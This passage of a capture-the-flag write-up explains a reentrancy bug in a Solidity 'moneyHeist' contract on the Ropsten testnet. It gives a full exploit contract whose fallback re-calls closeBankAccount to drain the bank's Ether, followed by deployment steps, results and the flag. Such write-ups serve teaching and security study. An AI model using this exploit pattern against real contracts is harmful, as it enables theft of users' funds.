+<p>We could call <code>dailyWithdrawalRequest</code> multiple times, but after the program exits <code>dailyWithdrawalRequest</code> for the first time <code>inWithdrawalProcess</code> would be set to <code>false</code>, <code>dailyWithdrawalRequest</code> would return and the next <code>require</code> check would fail, reverting our transaction.</p>
+<p>However, there is one other place in the contract where currency is transferred.</p>
+<div class="highlight"><pre><span></span><span class="kt">function</span><span class="w"> </span><span class="nv">closeBankAccount</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">isSuccessfulTransfer</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">.</span>call<span class="p">.</span>value<span class="p">(</span><span class="w"></span>
+<span class="w">        </span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"></span>
+<span class="w">    </span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="kt">require</span><span class="p">(</span>isSuccessfulTransfer<span class="p">);</span><span class="w"></span>
+<span class="w">    </span>bankRobberAccount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span>isAccountActive<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>The <code>closeBankAccount</code> function does not perform any checks after calling our external code and it only updates the state afterwards! This is perfect for our attack.</p>
+<h2>🛠 Setting up our dev environment</h2>
+<p>If you haven't worked with challenges on the blockchain before, there is a little bit of setup you'll need to do first.</p>
+<h3>🦊 MetaMask</h3>
+<p>Since this challenge takes place on the blockchain, you will need to be able to deploy your own contracts and create transactions. You can do this using the <a href="https://metamask.io">MetaMask</a> browser extension! Create a new account in MetaMask and switch to the <em>Ropsten network</em> (this is very important). You can use the <a href="https://faucet.metamask.io/">MetaMask faucet</a> to get some Ether for testing and deploying contracts.</p>
+<table>
+<thead>
+<tr>
+<th>Faucet</th>
+<th>Balance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="The MetaMask faucet" class="pure-img" src="../../images/6fa32cba-8f70-4599-8ce2-e627db7832a9.png"/></td>
+<td><img alt="My wallet balance now contains 5 Ether for testing" class="pure-img" src="../../images/3cd9d3f1-257e-4978-8ed3-1f7b33d45f57.png"/></td>
+</tr>
+</tbody>
+</table>
+<h3>Remix IDE</h3>
+<p>Next we can open the <a href="https://remix.ethereum.org/">Remix Ethereum IDE</a> to start writing and deploying contracts. In Remix make sure to switch the environment to <code>Injected Web3</code> to use your MetaMask client for making transactions on the network. Create files for <code>moneyHeist.sol</code>, <code>SafeMath.sol</code> (a maths library used by lots of smart contracts which handles overflows) and our exploit <code>moneyExploit.sol</code>. You can get the source code for SafeMath <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol">here</a>.</p>
+<h2>🧑‍💻 Developing our exploit</h2>
+<p>Our exploit is pretty simple now that we have an understanding of how reentrancy attacks work. First we need to create an account in the <code>moneyHeist</code> contract and add some funds. Then we can call <code>closeBankAccount</code> multiple times until we have drained the bank of all of its Ether.</p>
+<div class="highlight"><pre><span></span><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<span class="kt">import</span><span class="w"> </span><span class="s2">"./moneyHeist.sol"</span><span class="p">;</span><span class="w"></span>
+
+<span class="k">contract</span><span class="w"> </span><span class="ni">moneyExploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">private </span><span class="nv">_owner</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">constructor</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="c1">// store the address of the creator of the contract, the "owner"</span>
+<span class="w">        </span>_owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">execute</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">heistAddress</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>_owner<span class="p">);</span><span class="w"></span>
+
+<span class="w">        </span>moneyHeist<span class="w"> </span>heist<span class="w"> </span><span class="o">=</span><span class="w"> </span>moneyHeist<span class="p">(</span>heistAddress<span class="p">);</span><span class="w"></span>
+
+<span class="w">        </span><span class="c1">// create a new account using the currency in this function call</span>
+<span class="w">        </span>heist<span class="p">.</span>createNewAccount<span class="p">.</span>value<span class="p">(</span><span class="k">msg.value</span><span class="p">)();</span><span class="w"></span>
+
+<span class="w">        </span><span class="c1">// start the attack by closing the account</span>
+<span class="w">        </span>heist<span class="p">.</span>closeBankAccount<span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span>fallback<span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="c1">// if the bank has any more money, close the account again</span>
+<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="p">.</span>balance<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span>moneyHeist<span class="p">(</span><span class="k">msg.sender</span><span class="p">).</span>closeBankAccount<span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">drain</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="c1">// check that the caller is the owner</span>
+<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>_owner<span class="p">);</span><span class="w"></span>
+
+<span class="w">        </span><span class="c1">// self destruct, sending all of our earnings to the owner</span>
+<span class="w">        </span>selfdestruct<span class="p">(</span><span class="k">msg.sender</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>In the <code>moneyExploit</code> code above, calling <code>execute</code> with the address of the <code>moneyHeist</code> contract will start our attack. The withdrawal begins and each time the bank sends currency to us, the <code>fallback</code> method is executed. We have to check that the <code>moneyHeist</code> contract has funds to send us, otherwise requesting to close the bank account again would cause our attack to fail. If its balance is higher than the amount we have in our account, we call <code>closeBankAccount</code> again. This repeats until we have collected all of the funds from the bank. 🤯</p>
+<p>After this is all complete, we can use the <code>drain</code> method if we'd like to transfer the money to our own wallet. 🤑</p>
+<h3>💥 Using the exploit</h3>
+<p>First deploy the exploit contract on the Ropsten test network.</p>
+<table>
+<thead>
+<tr>
+<th>Remix IDE</th>
+<th>MetaMask transaction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="Remix IDE after deploying the contract" class="pure-img" src="../../images/40e64dbe-f9af-4a32-a9a1-040c37048e00.png"/></td>
+<td><img alt="The MetaMask transaction confirmation screen for deploying the contract" class="pure-img" src="../../images/97bc896a-64bc-470f-a91d-568db13b3085.png"/></td>
+</tr>
+</tbody>
+</table>
+<p>Next we start our attack by sending some currency to the <code>execute</code> function!</p>
+<p>Make sure to send exactly the right amount to cleanly empty the contract's balance or you might have issues. Since the contract contains <code>0.01 Ether</code>, you should send <code>0.01</code>, <code>0.005</code> or <code>0.001</code> as these divide <code>0.01</code> to a whole number (each iteration of <code>closeBankAccount</code> withdraws this much from the contract).</p>
+<table>
+<thead>
+<tr>
+<th>Transaction value</th>
+<th>Address parameter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="Set the transaction value to 0.01 Ether" class="pure-img" src="../../images/9859ead3-ec48-4dba-8d04-870ad74e0c2e.png"/></td>
+<td><img alt="Set the moneyHeist address in the field next to the execute button" class="pure-img" src="../../images/7f80df79-012f-4e06-a8ff-a2aafb64e604.png"/></td>
+</tr>
+</tbody>
+</table>
+<p>Set the transaction value, copy the <code>moneyHeist</code> contract address into the field, and then press <code>execute</code>. After confirming the transaction in MetaMask, a few moments later the transaction will be processed and our contract will be executed.</p>
+<table>
+<thead>
+<tr>
+<th>Etherscan</th>
+<th>MetaMask transaction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="Etherscan showing the successful transaction" class="pure-img" src="../../images/7e5c8695-cec6-49b5-991a-4a2b51bdcf12.png"/></td>
+<td><img alt="The MetaMask transaction confirmation screen for executing our contract" class="pure-img" src="../../images/49104fdd-c01a-4f49-8640-ee4aeff370c0.png"/></td>
+</tr>
+</tbody>
+</table>
+<p>As you can see here, three transfers took place. The first was our contract sending <code>0.01 Ether</code> to <code>moneyHeist</code>, but the following two were withdrawals from the contract. Our exploit worked!</p>
+<p><img alt="The moneyHeist contract balance is now 0 Ether" class="pure-img" src="../../images/2dde2158-35a4-4169-94b6-b2e908e29e6a.png"/></p>
+<p>As you can see on <a href="https://ropsten.etherscan.io/address/0x396d73a08f112e67dd89245707bbdc00dcfa24f7#internaltx">Etherscan</a> the contract now contains no Ether. Our contract on the other hand contains <code>0.02 Ether</code>. 😎</p>
+<h3>🚩 Claiming the flag</h3>
+<p>To complete the challenge, we head back to the web page and click the <code>Check Flag</code> button. It gives us the flag: <code>HTB{Th3_D4ng3R_0f_Re3nTr4ncY}</code>.</p>
+</main>
+</div>
+</div>
+</div>
+</body>
+</html>
